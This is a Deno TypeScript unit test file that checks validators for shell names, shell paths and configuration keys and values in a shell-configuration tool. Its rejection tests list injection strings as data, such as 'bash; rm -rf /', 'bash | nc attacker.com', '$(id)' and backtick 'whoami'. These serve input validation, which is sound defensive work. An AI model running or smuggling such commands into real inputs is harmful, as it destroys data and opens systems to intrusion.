// SPDX-License-Identifier: PMPL-1.0-or-later
// tests/unit/shell_config_test.ts - Unit tests for shell configuration contracts
//
// Tests valid shell names, paths, key formats, and value constraints.

import {
  assertEquals,
  assertStringIncludes,
  assertThrows,
} from "https://deno.land/std@0.208.0/assert/mod.ts";

// ============================================================================
// Shell Configuration Contracts
// ============================================================================

interface ShellConfig {
  name: string;
  path: string;
  isValid: boolean;
}

interface ConfigEntry {
  key: string;
  value: string;
  isValid: boolean;
}

/**
 * Valid shell names that modshells supports.
 */
const VALID_SHELLS = [
  "bash",
  "zsh",
  "fish",
  "dash",
  "ksh",
  "tcsh",
  "ion",
  "nushell",
  "oils",
  "pwsh",
];

/**
 * Validate a shell name according to contract.
 * - Must be in the list of supported shells
 * - Must be lowercase
 */
function validateShellName(name: string): boolean {
  if (name !== name.toLowerCase()) return false;
  return VALID_SHELLS.includes(name);
}

/**
 * Validate a shell path according to contract.
 * - Can be either absolute path or just the name
 * - No relative paths (cannot contain ".." or "./")
 * - No special shell metacharacters (;, |, &, >, <, `, $)
 */
function validateShellPath(path: string): boolean {
  // Reject relative paths
  if (path.includes("..") || path.startsWith("./")) return false;

  // Reject shell injection characters
  const injectionChars = [";", "|", "&", ">", "<", "`", "$", "(", ")", "{", "}"];
  if (injectionChars.some((char) => path.includes(char))) return false;

  // Allow absolute paths or just shell names
  if (path.startsWith("/")) return true;
  return validateShellName(path);
}

/**
 * Validate a configuration key according to contract.
 * - Alphanumeric + underscore only
 * - No equals signs, colons, or special chars
 * - Must not be empty
 */
function validateConfigKey(key: string): boolean {
  if (key.length === 0) return false;
  return /^[a-zA-Z0-9_]+$/.test(key);
}

/**
 * Validate a configuration value according to contract.
 * - Any string except null bytes (\0)
 * - Empty string is valid
 */
function validateConfigValue(value: string): boolean {
  return !value.includes("\0");
}

// ============================================================================
// Unit Tests
// ============================================================================

Deno.test("Valid shell names are accepted", () => {
  for (const shell of VALID_SHELLS) {
    assertEquals(validateShellName(shell), true, `${shell} should be valid`);
  }
});

Deno.test("Invalid shell names are rejected", () => {
  const invalid = ["Bash", "BASH", "Zsh", "fish ", " fish", "python", "ruby"];
  for (const shell of invalid) {
    assertEquals(validateShellName(shell), false, `${shell} should be invalid`);
  }
});

Deno.test("Valid absolute shell paths are accepted", () => {
  const validPaths = [
    "/bin/bash",
    "/usr/bin/zsh",
    "/usr/local/bin/fish",
    "/opt/shells/bash",
  ];
  for (const path of validPaths) {
    assertEquals(validateShellPath(path), true, `${path} should be valid`);
  }
});

Deno.test("Valid shell name paths are accepted", () => {
  for (const shell of VALID_SHELLS) {
    assertEquals(validateShellPath(shell), true, `${shell} path should be valid`);
  }
});

Deno.test("Relative shell paths are rejected", () => {
  const invalid = ["./bash", "../bin/bash", "../../bash", "./zsh"];
  for (const path of invalid) {
    assertEquals(validateShellPath(path), false, `${path} should be invalid`);
  }
});

Deno.test("Shell path injection attacks are rejected", () => {
  const malicious = [
    "bash; rm -rf /",
    "bash | nc attacker.com",
    "bash && evil",
    "bash > file",
    "bash < file",
    "/bin/bash`whoami`",
    "/bin/bash$(id)",
    "/bin/bash(dangerous)",
  ];
  for (const path of malicious) {
    assertEquals(validateShellPath(path), false, `${path} should be rejected`);
  }
});

Deno.test("Valid configuration keys are accepted", () => {
  const valid = ["SHELL_PATH", "shell_path", "SHELL", "S", "shell123", "_shell"];
  for (const key of valid) {
    assertEquals(validateConfigKey(key), true, `${key} should be valid`);
  }
});

Deno.test("Invalid configuration keys are rejected", () => {
  const invalid = [
    "",
    "shell-name",
    "shell.name",
    "shell:name",
    "shell=name",
    "shell name",
    "shell@name",
  ];
  for (const key of invalid) {
    assertEquals(validateConfigKey(key), false, `${key} should be invalid`);
  }
});

Deno.test("Configuration key injection attacks are rejected", () => {
  const malicious = ["SHELL=bash", "key;other=value", "key$(id)"];
  for (const key of malicious) {
    assertEquals(validateConfigKey(key), false, `${key} should be rejected`);
  }
});

Deno.test("Valid configuration values are accepted", () => {
  const valid = ["", "bash", "value with spaces", "value:with:colons", "/path/to/file"];
  for (const value of valid) {
    assertEquals(validateConfigValue(value), true, `"${value}" should be valid`);
  }
});

Deno.test("Configuration values with null bytes are rejected", () => {
  assertEquals(validateConfigValue("value\0malicious"), false);
  assertEquals(validateConfigValue("\0"), false);
});

Deno.test("Shell names are always lowercase", () => {
  for (const shell of VALID_SHELLS) {
    assertEquals(shell, shell.toLowerCase());
  }
});

Deno.test("Empty shell names are rejected", () => {
  assertEquals(validateShellName(""), false);
});

Deno.test("Empty shell paths are rejected", () => {
  assertEquals(validateShellPath(""), false);
});

Deno.test("Path traversal via encoded characters is rejected", () => {
  assertEquals(validateShellPath("..%2fbash"), false);
  assertEquals(validateShellPath("%2e%2e%2fbash"), false);
});
